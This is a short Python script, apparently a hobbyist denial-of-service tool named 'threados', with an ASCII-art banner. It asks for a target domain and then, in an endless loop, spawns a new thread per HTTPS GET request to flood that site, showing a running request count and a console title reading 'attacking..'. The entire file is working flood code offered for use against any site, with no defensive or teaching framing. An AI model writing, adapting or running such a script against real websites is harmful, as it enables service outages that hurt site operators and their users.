import subprocess
import requests
import threading
print("")
print("   /$$     /$$                                           /$$                    ")
print("  | $$    | $$                                          | $$                    ")
print(" /$$$$$$  | $$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$   /$$$$$$$")
print("|_  $$_/  | $$__  $$ /$$__  $$ /$$__  $$ |____  $$ /$$__  $$ /$$__  $$ /$$_____/")
print("  | $$    | $$  \ $$| $$  \__/| $$$$$$$$  /$$$$$$$| $$  | $$| $$  \ $$|  $$$$$$ ")
print("  | $$ /$$| $$  | $$| $$      | $$_____/ /$$__  $$| $$  | $$| $$  | $$ \____  $$")
print("  |  $$$$/| $$  | $$| $$      |  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$/ /$$$$$$$/")
print("   \___/  |__/  |__/|__/       \_______/ \_______/ \_______/ \______/ |_______/ ")
print("")
subprocess.run("title threados", shell=True)
domain = input("   target >> ")
count = 0

def send_request(url):
    try:
        requests.get(url)
    except Exception as error:
        print("error:", error)
while True:
     try:
        subprocess.run("title threados // attacking..", shell=True)
        thread = threading.Thread(target=send_request, args=("https://" + domain,))
        thread.start()
        count += 1
        print(f"\r    requests >> {count}", end="", flush=True)
     except Exception as error:
       print("error:", error)
       break
